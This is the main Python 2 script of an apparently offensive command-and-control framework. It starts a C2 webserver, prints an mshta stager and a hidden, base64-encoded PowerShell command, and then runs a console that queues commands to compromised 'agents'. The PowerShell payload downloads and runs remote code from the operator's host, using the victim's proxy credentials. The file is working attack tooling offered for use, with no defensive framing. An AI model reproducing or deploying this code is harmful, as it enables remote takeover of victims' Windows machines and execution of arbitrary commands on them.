from core import webserver
from core import header
from core.cmd import cmd
from core import config
import urllib2
import threading
import readline
# _____ ___________ ___________  ________   __  _____  _       ___ ______ _____  ___ _____ ___________ 
#/  __ \  _  |  _  \  ___|  _  \ | ___ \ \ / / |  __ \| |     / _ \|  _  \_   _|/ _ \_   _|  _  | ___ \
#| /  \/ | | | | | | |__ | | | | | |_/ /\ V /  | |  \/| |    / /_\ \ | | | | | / /_\ \| | | | | | |_/ /
#| |   | | | | | | |  __|| | | | | ___ \ \ /   | | __ | |    |  _  | | | | | | |  _  || | | | | |    / 
#| \__/\ \_/ / |/ /| |___| |/ /  | |_/ / | |   | |_\ \| |____| | | | |/ / _| |_| | | || | \ \_/ / |\ \ 
# \____/\___/|___/ \____/|___/   \____/  \_/    \____/\_____/\_| |_/___/  \___/\_| |_/\_/  \___/\_| \_|
#                                                                                                      
#
#GLADIATOR_CRK WAS HERE
def main():

	header.Banner()
	ip = urllib2.urlopen('http://ip.42.pl/raw').read()
	CC = raw_input('Enter a ip:port for C&C: ip:port: %s:'%(ip)).strip()
	
	CC = [ip,CC]
	config.set_port(CC[1])
	config.set_ip(CC[0])
	server = threading.Thread(target=webserver.main,args=())
	server.start()
	cmd().help()
	print "\nmshta http://%s:%s/hta\n"%(config.IP,config.PORT)
	command = '''Start-Process powershell -ArgumentList "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{payload}')))" -WindowStyle Hidden'''
	payload = "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://{ip}:{port}/get');IEX($s)"
	payload = payload.replace('{ip}',config.IP).replace('{port}',config.PORT)
	payload = payload.encode("base64").replace('\n','')
	print command.replace('{payload}',payload)
	while True:
		if(config.POINTER == 'main'):
			command = raw_input('(%s : %s) '%(config.BASE,config.POINTER))
		else:
			command = raw_input('(%s : Agent(%s)-%s) '%(config.BASE,str(config.AGENTS[config.POINTER][0]),config.AGENTS[config.POINTER][1]))
		bcommand = command.strip().split()
		if(bcommand):
			if(bcommand[0] in cmd.COMMANDS):
				result = getattr(globals()['cmd'](),bcommand[0])(bcommand)
			elif(bcommand[0] not in cmd.COMMANDS and config.POINTER != 'main'):
				config.COMMAND[config.POINTER].append(command.strip())
if __name__ == '__main__':
	main()
